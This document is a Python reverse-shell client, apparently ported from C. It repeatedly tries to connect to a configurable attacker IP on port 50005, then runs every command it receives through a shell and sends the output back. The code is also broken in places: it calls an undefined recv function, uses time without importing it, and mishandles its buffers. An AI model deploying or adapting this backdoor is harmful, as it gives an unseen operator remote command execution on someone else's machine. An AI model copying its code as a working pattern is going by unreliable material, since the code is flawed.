import socket
import os
import subprocess

# Function to reset mem on bzero but for Linux
def bzero(p, size):
    return bytearray(size)

# different string manipulations to be able to cut the string for changing dirs
def str_cut(s, slice_from, slice_to):
    if len(s) == 0:
        return None

    if slice_to < 0 and slice_from > slice_to:
        str_len = len(s)
        if abs(slice_to) > str_len - 1:
            return None

        if abs(slice_from) > str_len:
            slice_from = (-1) * str_len

        buffer_len = slice_to - slice_from
        s = s[(str_len + slice_from):]

    elif slice_from >= 0 and slice_to > slice_from:
        str_len = len(s)

        if slice_from > str_len - 1:
            return None
        buffer_len = slice_to - slice_from
        s = s[slice_from:]

    else:
        return None

    buffer = bytearray(buffer_len)
    buffer[:len(s)] = s.encode('utf-8')
    return buffer.decode('utf-8')

def shell():
    while True:
        buffer = bytearray(1024)
        container = bytearray(1024)
        total_response = bytearray(18384)
        
        buffer_len = recv(sock, buffer, 1024, 0)
        buffer = buffer[:buffer_len].decode('utf-8')
        
        if buffer.startswith("exit"):
            sock.close()
            exit(0)
        elif buffer.startswith("cd "):
            os.chdir(str_cut(buffer, 3, 100))
        else:
            fp = subprocess.Popen(buffer, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            container_len = fp.stdout.readinto(container)
            total_response += container[:container_len]
            sock.send(total_response)
            fp.stdout.close()
            fp.stderr.close()

# Creating a socket object (IPV4, TCP CONNECTION)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Defining our server address and port
ServIP = " "  # Insert host machine IP here
ServPort = 50005

# Attempting to connect, if it doesn't connect, retry after 10 seconds
while True:
    try:
        sock.connect((ServIP, ServPort))
        break
    except:
        time.sleep(10)

shell()
